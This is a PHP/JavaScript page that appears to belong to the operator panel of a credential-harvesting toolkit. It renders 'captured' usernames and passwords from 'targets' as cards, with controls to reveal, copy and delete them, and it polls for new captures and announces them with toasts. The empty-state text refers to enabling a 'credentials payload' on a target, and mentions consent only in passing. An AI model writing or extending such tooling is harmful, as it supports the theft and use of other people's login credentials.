<?php
/**
 * route-credentials.php — UI for the "Credentials" sidebar route.
 *
 * Lists every captured form-credential event across every target.
 * Each card shows captured username/password + metadata. Follows
 * the same pattern as route-geo.php. Caller (panel.php) is
 * responsible for auth.
 */
?>
<section class="cred-section">

  <div class="cred-toolbar">
    <div class="cred-stats">
      <span class="badge badge-cyan" id="cred-stat-total"><span class="badge-dot cyan pulse"></span>0 CAPTURES</span>
      <span class="badge badge-muted" id="cred-stat-sources">0 SOURCES</span>
    </div>
    <div class="cred-actions-bar">
      <button type="button" class="btn btn-sm btn-outline" id="cred-refresh">
        <svg class="icon icon-sm"><use href="#i-refresh"/></svg> Refresh
      </button>
    </div>
  </div>

  <div class="cred-grid" id="cred-grid"></div>

  <div class="cred-empty" id="cred-empty" hidden>
    <svg class="icon icon-xl"><use href="#i-key"/></svg>
    <div class="cred-empty-title">No credentials captured yet</div>
    <div class="cred-empty-sub">// enable the <code>credentials</code> payload on a target — form submissions appear after consent is granted</div>
  </div>

</section>

<!-- Credential card template -->
<template id="cred-card-tpl">
  <div class="cred-card">
    <div class="cred-card-header">
      <svg class="icon icon-md cred-card-icon"><use href="#i-key"/></svg>
      <div class="cred-card-meta">
        <span class="cred-card-target c-target"></span>
        <span class="cred-card-time c-time"></span>
      </div>
    </div>
    <div class="cred-card-body">
      <div class="cred-field">
        <span class="cred-field-label">USERNAME</span>
        <div class="cred-field-value c-username"></div>
      </div>
      <div class="cred-field">
        <span class="cred-field-label">PASSWORD</span>
        <div class="cred-field-value cred-field-password">
          <span class="c-password"></span>
          <button type="button" class="btn btn-xs btn-ghost c-toggle-pw" title="Show/Hide">
            <svg class="icon icon-sm"><use href="#i-eye"/></svg>
          </button>
        </div>
      </div>
      <div class="cred-extra c-extra" hidden></div>
    </div>
    <div class="cred-card-footer">
      <span class="cred-card-url c-url"></span>
      <div class="cred-card-actions">
        <button type="button" class="btn btn-sm btn-ghost c-copy" title="Copy all">
          <svg class="icon icon-sm"><use href="#i-copy"/></svg>
        </button>
        <button type="button" class="btn btn-sm btn-ghost danger c-delete" title="Delete">
          <svg class="icon icon-sm"><use href="#i-trash"/></svg>
        </button>
      </div>
    </div>
  </div>
</template>

<script>
/* ── Credentials route ───────────────────────────────────────── */
(function () {
  const API         = 'api/credentials.php';
  const POLL_MS     = 5000;

  const $grid   = document.getElementById('cred-grid');
  const $empty  = document.getElementById('cred-empty');
  const $tpl    = document.getElementById('cred-card-tpl');
  const $bTotal = document.getElementById('cred-stat-total');
  const $bSrc   = document.getElementById('cred-stat-sources');
  const $btnRefresh = document.getElementById('cred-refresh');

  let lastCount = 0;

  function relTime(unix) {
    const diff = Math.max(0, Math.floor(Date.now()/1000) - unix);
    if (diff < 60)    return diff + 's ago';
    if (diff < 3600)  return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
  }

  function maskPw(pw) {
    if (!pw) return '—';
    return '•'.repeat(Math.min(pw.length, 20));
  }

  function render(payload) {
    const items = payload.items || [];

    $bTotal.innerHTML = '<span class="badge-dot cyan pulse"></span>' + items.length + ' CAPTURES';
    $bSrc.textContent = (payload.sources || 0) + ' SOURCES';

    if (items.length === 0) {
      $grid.innerHTML = '';
      $empty.hidden = false;
      lastCount = 0;
      return;
    }
    $empty.hidden = true;

    const sig = items.length + ':' + (items[0]?.id || '');
    if ($grid.dataset.sig === sig) return;
    $grid.dataset.sig = sig;

    $grid.innerHTML = '';
    items.forEach(it => {
      const node = $tpl.content.firstElementChild.cloneNode(true);

      node.querySelector('.c-target').textContent = '/' + it.target;
      node.querySelector('.c-time').textContent = relTime(it.ts) + ' · ' +
        new Date(it.ts * 1000).toISOString().slice(0, 19).replace('T', ' ') + ' UTC';

      const usernameEl = node.querySelector('.c-username');
      usernameEl.textContent = it.username || '—';
      if (it.username) usernameEl.classList.add('cyan');

      const pwEl   = node.querySelector('.c-password');
      const togBtn = node.querySelector('.c-toggle-pw');
      let revealed = false;
      pwEl.textContent = maskPw(it.password);
      togBtn.addEventListener('click', () => {
        revealed = !revealed;
        pwEl.textContent = revealed ? (it.password || '—') : maskPw(it.password);
        togBtn.querySelector('use').setAttribute('href', revealed ? '#i-eye-off' : '#i-eye');
      });

      // Extra fields beyond username/password
      const extraKeys = Object.keys(it.fields || {}).filter(k =>
        !['username','user','email','login','inp-username','name',
          'password','pass','passwd','inp-password'].includes(k)
      );
      const extraEl = node.querySelector('.c-extra');
      if (extraKeys.length) {
        extraEl.hidden = false;
        extraKeys.forEach(k => {
          const row = document.createElement('div');
          row.className = 'cred-extra-row';
          row.innerHTML = '<span class="cred-field-label">' + k.toUpperCase().replace(/[<>&"]/g, '') +
            '</span><span class="cred-field-value">' + String(it.fields[k]).replace(/[<>&"]/g, c =>
              ({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c])) + '</span>';
          extraEl.appendChild(row);
        });
      }

      const urlEl = node.querySelector('.c-url');
      if (it.url) {
        try {
          const u = new URL(it.url);
          urlEl.textContent = u.hostname + u.pathname;
        } catch (_) {
          urlEl.textContent = it.url;
        }
      }

      node.querySelector('.c-copy').addEventListener('click', () => {
        const text = 'Target: /' + it.target + '\nUsername: ' + (it.username || '') +
          '\nPassword: ' + (it.password || '') + '\nURL: ' + (it.url || '');
        copyToClipboard(text);
      });

      node.querySelector('.c-delete').addEventListener('click', () => deleteEntry(it));

      $grid.appendChild(node);
    });

    if (lastCount && items.length > lastCount && typeof fireToast === 'function') {
      fireToast('success', 'NEW CREDENTIALS', (items.length - lastCount) + ' new capture(s)');
    }
    lastCount = items.length;
  }

  function copyToClipboard(text) {
    const announce = ok => fireToast(ok ? 'success' : 'error', ok ? 'COPIED' : 'COPY FAILED',
      ok ? 'Credentials copied.' : 'Clipboard not available.');
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(text).then(() => announce(true), () => announce(false));
      return;
    }
    const ta = document.createElement('textarea');
    ta.value = text; ta.setAttribute('readonly','');
    ta.style.cssText = 'position:fixed;top:0;left:-9999px;opacity:0';
    document.body.appendChild(ta); ta.select();
    let ok = false; try { ok = document.execCommand('copy'); } catch (_) {}
    document.body.removeChild(ta);
    announce(ok);
  }

  async function deleteEntry(it) {
    if (!confirm('Delete this credential entry? This cannot be undone.')) return;
    try {
      const fd = new FormData();
      fd.append('action', 'delete');
      fd.append('id', it.id);
      const res  = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'delete failed');
      if (typeof fireToast === 'function') fireToast('success', 'ENTRY DELETED', '/' + it.target);
      load(false);
    } catch (e) {
      if (typeof fireToast === 'function') fireToast('error', 'DELETE FAILED', e.message);
    }
  }

  async function load(showError) {
    try {
      const res  = await fetch(API, { credentials: 'same-origin', cache: 'no-store' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'request failed');
      render(json);
    } catch (e) {
      if (showError && typeof fireToast === 'function') fireToast('error', 'LOAD FAILED', e.message);
    }
  }
  $btnRefresh.addEventListener('click', () => load(true));

  let pollTimer = null;
  function startPoll() { stopPoll(); pollTimer = setInterval(() => load(false), POLL_MS); }
  function stopPoll()  { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) stopPoll();
    else { load(false); startPoll(); }
  });

  load(false).then(startPoll);
})();
</script>

<style>
.cred-section { display: flex; flex-direction: column; gap: var(--space-4); }
.cred-toolbar {
  display: flex; align-items: center; justify-content: space-between;
  flex-wrap: wrap; gap: var(--space-3);
}
.cred-stats       { display: flex; gap: var(--space-2); flex-wrap: wrap; }
.cred-actions-bar { display: flex; gap: var(--space-2); flex-wrap: wrap; }

.cred-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
  gap: var(--space-4);
}

.cred-card {
  background: var(--bg-surface);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-lg);
  overflow: hidden;
  transition: border-color .15s;
}
.cred-card:hover { border-color: var(--accent-primary); }

.cred-card-header {
  display: flex; align-items: center; gap: var(--space-3);
  padding: var(--space-3) var(--space-4);
  border-bottom: 1px solid var(--border-subtle);
  background: var(--bg-overlay);
}
.cred-card-icon { color: var(--accent-primary); flex-shrink: 0; }
.cred-card-meta { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
.cred-card-target {
  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 600;
  color: var(--accent-cyan);
}
.cred-card-time {
  font-family: var(--font-mono); font-size: var(--text-xs);
  color: var(--text-muted);
}

.cred-card-body { padding: var(--space-4); display: flex; flex-direction: column; gap: var(--space-3); }
.cred-field { display: flex; flex-direction: column; gap: 2px; }
.cred-field-label {
  font-family: var(--font-mono); font-size: 10px; font-weight: 600;
  color: var(--text-muted); letter-spacing: .06em; text-transform: uppercase;
}
.cred-field-value {
  font-family: var(--font-mono); font-size: var(--text-sm);
  color: var(--text-primary);
  word-break: break-all;
}
.cred-field-value.cyan { color: var(--accent-cyan); }
.cred-field-password {
  display: flex; align-items: center; gap: var(--space-2);
}

.cred-extra { display: flex; flex-direction: column; gap: var(--space-2);
  padding-top: var(--space-2); border-top: 1px dashed var(--border-subtle); }
.cred-extra[hidden] { display: none !important; }
.cred-extra-row { display: flex; flex-direction: column; gap: 2px; }

.cred-card-footer {
  display: flex; align-items: center; justify-content: space-between;
  padding: var(--space-2) var(--space-4);
  border-top: 1px solid var(--border-subtle);
  background: var(--bg-overlay);
}
.cred-card-url {
  font-family: var(--font-mono); font-size: var(--text-xs);
  color: var(--text-muted); overflow: hidden; text-overflow: ellipsis;
  white-space: nowrap; max-width: 60%;
}
.cred-card-actions { display: flex; gap: var(--space-1); }

.cred-empty[hidden] { display: none !important; }
.cred-empty {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center;
  padding: var(--space-7) var(--space-4);
  background: var(--bg-surface);
  border: 1px dashed var(--border-subtle);
  border-radius: var(--radius-lg);
  color: var(--text-muted);
  gap: var(--space-2);
}
.cred-empty .icon { color: var(--text-muted); width: 36px; height: 36px; }
.cred-empty-title {
  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 600;
  color: var(--text-secondary); letter-spacing: .04em;
}
.cred-empty-sub { font-family: var(--font-mono); font-size: var(--text-xs); }
.cred-empty-sub code {
  background: var(--bg-overlay);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 1px 5px;
  color: var(--text-code);
}

.btn-xs { padding: 2px 4px; font-size: var(--text-xs); }
</style>
